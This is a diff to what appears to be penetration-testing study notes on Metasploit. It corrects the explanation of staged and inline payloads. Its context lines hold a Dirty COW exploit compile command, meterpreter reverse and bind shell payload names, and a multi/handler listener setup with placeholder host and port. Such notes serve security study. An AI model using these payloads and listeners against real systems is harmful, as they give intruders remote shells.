@@ -463,9 +463,10 @@ gcc -pthread 40839.c -o dirty -lcrypt
 
 ## MSF Payloads and Listeners
 - 64-bit (`x64`) payload cannot run on 32-bit architecture.
-- Staged payload (sent in 2 parts), non-staged/inline payload (exploit and shellcode sent separately).
+- Staged payload (exploit and shellcode sent separately).
+- Non-staged/inline payload (exploit and shellcode sent together).
   - `windows/x64/meterpreter/reverse_tcp` is staged.
-  - `windows/x64/meterpreter_reverse_tcp` is non-staged.
+  - `windows/x64/meterpreter_reverse_tcp` is non-staged/inline.
 
 ```
 windows/meterpreter/reverse_tcp
@@ -474,14 +475,13 @@ windows/x64/meterpreter/reverse_tcp
 windows/meterpreter/bind_tcp
 windows/x64/meterpreter/bind_tcp
 ```
-- For quick reference.
-
 ```
 use multi/handler
 set payload <payload>
 set LHOST <ip>
 set LPORT <port>
 ```
+- For quick reference.
 
 ### msfvenom
 #### Generating Payloads
